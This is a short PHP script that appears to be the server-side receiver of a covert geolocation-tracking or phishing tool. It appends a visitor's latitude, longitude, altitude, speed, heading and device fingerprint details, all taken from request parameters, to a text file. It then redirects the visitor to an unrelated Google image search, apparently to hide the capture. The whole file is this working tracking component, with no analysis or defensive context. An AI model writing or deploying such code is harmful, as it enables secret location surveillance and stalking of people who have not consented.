<?php

file_put_contents("geolocate.txt", "Latitude: " . $_GET['latitude'] . "\n" . "Longitude: " . $_GET["longitude"] . "\n" . "User-Agent: " . $_GET["useragent"] . "\n" . "Altitude: " . $_GET["altitude"] . "\n" . "Accuracy: " . $_GET["accuracy"] . "\n" . "Speed: "  . $_GET["speed"] . "\n" . "Heading: " . $_GET["heading"] . "\n" . "Platform: " . $_GET["platform"] . "\n" . "Cores: " . $_GET["hardware"] . "\n" . "Memory: "   . $_GET["memory"] ."\n" . "Screen Height: "   . $_GET["height"] ."\n" . "Screen Width: "   . $_GET["width"] ."\n", FILE_APPEND);

header('Location: https://www.google.com/search?q=Wahhh&tbm=isch&source=hp&safe=strict&fir=JHL-DdvEecV5fM%253A%252Cd1jw9_qrGktmTM%252C_%253BPNb7WkHiyoJN7M%253A%252C4AbH_sTXnqJ8jM%252C_%253B5oeF6mBx8r_woM%253A%252Cd1jw9_qrGktmTM%252C_%253BfB221f1DSkt8wM%253A%252CGcKvW13Z9WUfJM%252C_%253BrQNzQAx5Sf-axM%253A%252CI2w0VqdQrFwdNM%252C_%253B3e_MyPF3d_KWoM%253A%252CcRTKvw49uGIM9M%252C_%253BUcVT-63WmK02RM%253A%252CI2w0VqdQrFwdNM%252C_%253B9oqtEFq29P_00M%253A%252Cd1jw9_qrGktmTM%252C_%253BzwF3MadhHr4A7M%253A%252CxLvqCbEIGwOFuM%252C_%253BQQM1yh5OLZ1GGM%253A%252C9dguQdHYtca-hM%252C_&usg=AI4_-kR5nl1Rd7p96ndKb2YM2CE4kssD-Q&sa=X&ved=2ahUKEwiXtZKPkOThAhWaTX0KHaqpAP0QsAR6BAgKEAE#imgrc=JHL-DdvEecV5fM');
exit();
?>
